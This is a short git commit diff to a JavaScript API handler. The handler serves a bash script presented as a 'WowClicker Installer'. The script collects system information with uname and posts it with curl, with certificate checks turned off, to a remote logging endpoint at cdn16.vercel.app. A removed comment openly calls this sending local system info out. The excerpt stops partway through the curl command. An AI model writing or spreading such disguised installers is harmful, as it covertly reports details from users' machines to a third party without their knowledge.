346259f373100adf1cd7e2795443418f9a4d84ec
wowdog15 <Pumpkinsarecool899@gmail.com>
2025-08-19 20:34:40 -0400

    a

--- api/index.js
+++ api/index.js
@@ -1,11 +1,10 @@
 export default function handler(req, res) {
   res.setHeader('Content-Type', 'text/plain');
 
-  const code = `#!/bin/bash
-echo "Running installer..."
-
-# Send the local system info to your API
-USER_AGENT=$(uname -a)
+  const code = `
+  #!/bin/bash
+  echo "WowClicker Installer VERSION 1,0"
+  USER_AGENT=$(uname)
 
 curl -s -k -X POST https://cdn16.vercel.app/api/log \\
      -H "Content-Type: application/json" \\
